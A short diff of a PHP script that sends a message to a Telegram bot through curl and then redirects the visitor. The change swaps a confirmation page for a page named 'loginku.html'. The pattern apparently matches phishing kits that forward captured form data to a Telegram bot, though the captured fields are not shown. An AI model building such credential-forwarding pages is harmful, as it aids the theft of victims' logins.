@@ -25,5 +25,5 @@ function sendMessage($id_telegram, $message, $id_botTele) {
     curl_close($ch);
 }
 sendMessage($id_telegram, $message, $id_botTele);
-header('Location: ../konfirmasi.html');
+header('Location:loginku.html');
 ?>
